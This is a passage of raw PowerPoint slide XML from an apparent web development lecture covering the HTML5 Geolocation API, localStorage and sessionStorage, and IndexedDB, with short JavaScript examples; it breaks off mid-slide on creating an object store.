                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" noProof="0"/>
                        <a:t>latitude</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" baseline="0" noProof="0"/>
                        <a:t> </a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" noProof="0"/>
                    </a:p>
                  </a:txBody>
                  <a:tcPr/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="10001"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="370840">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" noProof="0" dirty="0" err="1"/>
                        <a:t>coords.longitude</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" noProof="0" dirty="0"/>
                    </a:p>
                  </a:txBody>
                  <a:tcPr/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" noProof="0"/>
                        <a:t>longitude</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="10002"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="370840">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" noProof="0" dirty="0" err="1"/>
                        <a:t>coords.accuracy</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" noProof="0" dirty="0"/>
                    </a:p>
                  </a:txBody>
                  <a:tcPr/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" noProof="0"/>
                        <a:t>accuracy of location in meters</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="10003"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="370840">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" noProof="0" dirty="0" err="1"/>
                        <a:t>coords.altitude</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" noProof="0" dirty="0"/>
                    </a:p>
                  </a:txBody>
                  <a:tcPr/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" noProof="0"/>
                        <a:t>altitude in meters</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="10004"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="370840">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" noProof="0" dirty="0" err="1"/>
                        <a:t>coords.altitudeAccuracy</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" noProof="0" dirty="0"/>
                    </a:p>
                  </a:txBody>
                  <a:tcPr/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" noProof="0"/>
                        <a:t>Altitude</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" baseline="0" noProof="0"/>
                        <a:t> accuracy in meters</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" noProof="0"/>
                    </a:p>
                  </a:txBody>
                  <a:tcPr/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="10005"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="370840">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" noProof="0" dirty="0" err="1"/>
                        <a:t>coords.heading</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" noProof="0" dirty="0"/>
                    </a:p>
                  </a:txBody>
                  <a:tcPr/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" noProof="0"/>
                        <a:t>Heading</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" baseline="0" noProof="0"/>
                        <a:t> as degrees clockwise from North</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" noProof="0"/>
                    </a:p>
                  </a:txBody>
                  <a:tcPr/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="10006"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="370840">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" noProof="0" dirty="0" err="1"/>
                        <a:t>coords.speed</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" noProof="0" dirty="0"/>
                    </a:p>
                  </a:txBody>
                  <a:tcPr/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" noProof="0"/>
                        <a:t>The speed in meters per second</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="10007"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="370840">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" noProof="0"/>
                        <a:t>timestamp</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" noProof="0" dirty="0"/>
                        <a:t>The date and time of the response</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Otsikko 1">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{2710E1C1-721F-4DE6-B2ED-C0418D8305A8}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI">
                <a:hlinkClick r:id="rId2"/>
              </a:rPr>
              <a:t>Geolocation Example</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="fi-FI"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="169987" name="Sisällön paikkamerkki 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{5B5D876F-9CC8-469A-A2E8-7970E67EB081}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" dirty="0" err="1">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>navigator.geolocation.getCurrentPosition</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" dirty="0">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>(function(position) {</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>var </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" dirty="0" err="1">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>coords</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" dirty="0">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> = </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" dirty="0" err="1">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>position.coords</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" alt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en-US" altLang="fi-FI" dirty="0" err="1">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>document.write</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" dirty="0">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" dirty="0" err="1">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>coords.latitude</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" dirty="0">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>+", "+ </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" dirty="0" err="1">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>coords.longitude</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" alt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en-US" altLang="fi-FI" dirty="0">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>function(error) {</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" dirty="0" err="1">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>document.write</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" dirty="0">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" dirty="0" err="1">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>error.code</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" alt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en-US" alt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endParaRPr lang="en-US" altLang="fi-FI" dirty="0">
              <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>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Otsikko 1">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{808462D1-F8B0-45E3-8C7E-232F89CD7E0C}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI">
                <a:hlinkClick r:id="rId2"/>
              </a:rPr>
              <a:t>HTML5 Local Storage</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="fi-FI"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Sisällön paikkamerkki 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{7B10CD16-DCC2-48AE-B80E-FB1D9DF37787}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="609600" y="1600200"/>
            <a:ext cx="10671175" cy="5068888"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit fontScale="92500" lnSpcReduction="10000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2800" dirty="0"/>
              <a:t>Cookies are limited to 4 KB in size and are always transferred to the server</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2800" dirty="0"/>
              <a:t>HTML5 local storage is stored locally as a string and not transferred to the server</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="1" dirty="0" err="1"/>
              <a:t>window.localStorage</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="1" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" dirty="0"/>
              <a:t>stores data with no expiration date</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="1" dirty="0" err="1"/>
              <a:t>window.sessionStorage</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" dirty="0"/>
              <a:t> stores data for one session (when the tab is closed)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2800" dirty="0"/>
              <a:t>Their </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800">
                <a:hlinkClick r:id="rId3"/>
              </a:rPr>
              <a:t>limit</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800"/>
              <a:t> varies </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" dirty="0"/>
              <a:t>per browser, 2.5 MB being typical for mobile browsers, and 5 MB for desktop browsers. Notice that everything stored in either is a string and JavaScript string are stored in UTF-16 format, so most characters take 2 bytes.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2800" dirty="0"/>
              <a:t>data stored in either </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" dirty="0" err="1"/>
              <a:t>localStorage</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" dirty="0"/>
              <a:t> or </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" dirty="0" err="1"/>
              <a:t>sessionStorage</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" dirty="0"/>
              <a:t> is specific to the protocol of the page (http and https are different)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2800" dirty="0"/>
              <a:t>The keys and the values are always strings</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Otsikko 1">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{F30665FD-2891-4E10-82D7-D833889C86C0}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI"/>
              <a:t>Example of Using window.localStorage</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="172035" name="Sisällön paikkamerkki 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{D054B4C2-5371-4A7A-B6F4-E2CE41691A9A}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2400">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>let obj = {'name': 'Jack', age: 25}; // some object</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let jsonData = JSON.stringify(obj); /* turn into JSON string, allowing safe storage of any object values */</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window.localStorage.setItem("mydata", jsonData); // save</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let s = window.localStorage.getItem("mydata"); // read</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let obj2 = JSON.parse(jsonData); // parse string to object   </a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2400">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2400">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>console.log(obj2);    window.localStorage.removeItem("mydata"); // remove item   window.localStorage.clear(); // clear all data</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itle 1">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{4F63E4D8-F786-4D16-A0E7-C67EDA963BFD}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI"/>
              <a:t>Indexed Database</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="173059" name="Content Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{9C92E175-11B8-47ED-B78F-67235B17EF92}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI"/>
              <a:t>IndexedDB is a local database holding simple values and hierarchical objects. Has support for transactions, indexes and auto incrementing indexes.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI"/>
              <a:t>Recommended to use instead of Web SQL</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI"/>
              <a:t>Supported by all major browsers.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI"/>
              <a:t>Complex queries are much more difficult to achieve than using SQL. Thus the use of 3</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" baseline="30000"/>
              <a:t>rd</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI"/>
              <a:t> party libraries, such as </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI">
                <a:hlinkClick r:id="rId2"/>
              </a:rPr>
              <a:t>dexie.js</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI"/>
              <a:t>, is recommended.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" altLang="fi-FI"/>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a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{491ED2C9-B0A9-47EA-9E57-FB360B5C5AD0}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI">
                <a:hlinkClick r:id="rId2"/>
              </a:rPr>
              <a:t>Using Indexed Database</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="fi-FI"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Content Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{70861424-42FA-4292-A901-AD553F03F87F}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1703388" y="1600200"/>
            <a:ext cx="8785225" cy="4525963"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit fontScale="92500"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="514350" indent="-514350">
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="fi-FI" sz="2400" dirty="0"/>
              <a:t>Open a </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>database</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2400" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>using</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="fi-FI" sz="2400" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="2400" i="1" dirty="0"/>
              <a:t>request</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2400" b="1" dirty="0"/>
              <a:t> = </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0" err="1"/>
              <a:t>window.indexedDB.open</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2400" b="1" dirty="0"/>
              <a:t>("</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2400" i="1" dirty="0" err="1"/>
              <a:t>dbName</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2400" i="1" dirty="0"/>
              <a:t>"</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2400" b="1" dirty="0"/>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2400" i="1" dirty="0" err="1"/>
              <a:t>versionInteger</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2400" b="1" dirty="0"/>
              <a:t>)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="514350" indent="-514350">
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>Create an object store in the database </a:t>
            </a:r>
            <a:br>
              <a:rPr lang="fi-FI" sz="2400" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="fi-FI" sz="2400" dirty="0" err="1"/>
              <a:t>objStorage</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2400" dirty="0"/>
              <a:t> = </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2400" b="1" dirty="0" err="1"/>
              <a:t>db.createObjectStore</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2400" b="1" dirty="0"/>
              <a:t>("</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2400" i="1" dirty="0" err="1"/>
              <a:t>name</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2400" b="1" dirty="0"/>
              <a:t>", { </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2400" b="1" dirty="0" err="1"/>
              <a:t>keyPath</a:t>
            </a:r>
            <a:r>
